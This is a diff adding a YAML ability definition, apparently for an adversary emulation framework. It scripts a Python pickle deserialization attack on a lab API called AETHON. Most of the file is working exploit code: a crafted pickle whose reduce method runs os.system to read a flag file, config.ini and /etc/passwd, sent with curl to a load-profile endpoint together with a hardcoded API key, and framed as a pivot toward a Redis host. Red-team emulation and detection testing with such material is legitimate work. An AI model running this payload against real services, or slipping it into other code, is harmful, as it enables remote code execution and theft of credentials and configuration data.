@@ -1,0 +1,71 @@
+- name: AETHON Pickle Deserialization — RCE via Insecure Python Object Deserialization
+  description: >
+    Exploits Python Pickle deserialization vulnerability in the AETHON R&D
+    Field Analyst API (aethon-dev, port 8080). Crafts a malicious pickled
+    payload that executes an OS command when deserialized. Uses the API key
+    discovered from the config.ini file found after SSH access. The attack
+    reads flag3.txt and the Redis connection config, pivoting toward aethon-cache.
+    Generates Python pickle exception traces and subprocess events in application logs.
+  tactic: execution
+  technique_id: T1059.006
+  technique_name: 'Command and Scripting Interpreter: Python'
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  executors:
+  - name: sh
+    platform: linux
+    command: >
+      TARGET_HOST=$(cat /tmp/aethon_target_m3 2>/dev/null || echo "aethon-dev");
+      TARGET_PORT="8080";
+      API_KEY="dev-internal-2024-xK9mP";
+      echo "[*] Generating malicious pickle payload...";
+      python3 -c "
+      import pickle, os, base64
+
+      class RCE(object):
+          def __reduce__(self):
+              cmd = 'id > /tmp/rce_proof.txt && cat /opt/aethon-api/flag3.txt >> /tmp/rce_proof.txt && cat /opt/aethon-api/config.ini >> /tmp/rce_proof.txt'
+              return (os.system, (cmd,))
+
+      payload = base64.b64encode(pickle.dumps(RCE())).decode()
+      print(payload)
+      " > /tmp/pickle_payload.txt;
+      PAYLOAD=$(cat /tmp/pickle_payload.txt);
+      echo "[*] Sending pickle payload to http://$TARGET_HOST:$TARGET_PORT/api/load-profile...";
+      curl -s -X POST "http://$TARGET_HOST:$TARGET_PORT/api/load-profile"
+        -H "Content-Type: application/json"
+        -H "X-API-Key: $API_KEY"
+        -d "{\"profile\": \"$PAYLOAD\"}"
+        -o /tmp/pickle_response.txt;
+      echo "[*] Response:"; cat /tmp/pickle_response.txt;
+      echo "[*] Checking RCE proof on target (if local)...";
+      cat /tmp/rce_proof.txt 2>/dev/null || echo "(rce_proof.txt not present locally — executed on target)"
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers:
+    - module: plugins.atomic.app.parsers.atomic_sh
+      parserconfigs:
+      - source: validate_me
+        edge: ''
+        target: ''
+        custom_parser_vals: {}
+    cleanup:
+    - rm -f /tmp/pickle_payload.txt /tmp/pickle_response.txt /tmp/rce_proof.txt /tmp/aethon_target_m3
+    variations:
+    - description: Pickle payload to read /etc/passwd on target
+      command: >
+        python3 -c "
+        import pickle, os, base64
+        class RCE(object):
+            def __reduce__(self):
+                return (os.system, ('cat /etc/passwd > /tmp/passwd_dump.txt',))
+        print(base64.b64encode(pickle.dumps(RCE())).decode())
+        "
+    additional_info: {}
+  requirements: []
+  id: 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d
